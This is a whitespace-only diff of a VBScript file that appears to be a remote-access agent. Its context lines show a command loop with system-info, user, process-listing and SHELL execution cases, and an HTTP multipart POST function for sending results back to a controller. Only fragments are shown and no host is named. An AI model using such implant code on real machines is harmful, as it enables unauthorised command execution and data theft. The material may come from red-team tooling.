@@ -77,7 +77,7 @@ While True
         ' Sleep X seconds
         Case "NOOP"
             WScript.Sleep intSleep
-        
+
         ' Get host info
         Case "SYSINFO"
             Dim objOS, strComputer, strOS, strBuild, strServicePack, strArchitecture, strLanguage
@@ -97,7 +97,7 @@ While True
                 strVersion = strVersion & ", " & strServicePack
             End If
             strVersion = strVersion & ")"
-            
+
             strInfo = "Computer: " & strComputer & vbCrLf & _
                       "OS: " & strVersion & vbCrLf & _
                       "Architecture: " & strArchitecture & vbCrLf & _
@@ -111,7 +111,7 @@ While True
             strUserDomain = shell.ExpandEnvironmentStrings("%USERDOMAIN%")
             strUsername = shell.ExpandEnvironmentStrings("%USERNAME%")
             strInfo = "Username: " & strUserDomain & "\" & strUserName
-            
+
             SendStatusUpdate strRawCommand, strInfo
 
         ' IP configuration
@@ -156,7 +156,7 @@ While True
                     Case Else
                         strDomainUser = "[Other]"
                 End Select
-                
+
                 strPath = objProcess.ExecutablePath
 
                 strInfo = strInfo & PadRight(strPid, 5) & "  " & PadRight(strName, 24) & "  " & PadRight(strSession, 7) & "  " & PadRight(strDomainUser, 19) & "  " & strPath & vbCrLf
@@ -178,7 +178,7 @@ While True
                 SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
                 strSleep = Empty
             End If
-        
+
         ' Execute command
         Case "SHELL"
             'Execute and write to file
@@ -369,7 +369,7 @@ Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
     http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
     http.SetTimeouts 5000, 60000, 60000, 60000
     http.Send binConcatenated
-    
+
     ' Receive response
     DoHttpBinaryPost = http.ResponseText
 End Function
@@ -387,7 +387,7 @@ Function StringToBinary(Text)
     ' Change stream type To binary
     stream.Position = 0
     stream.Type = 1 'adTypeBinary
-  
+
     ' Return binary data
     StringToBinary = stream.Read
 End Function
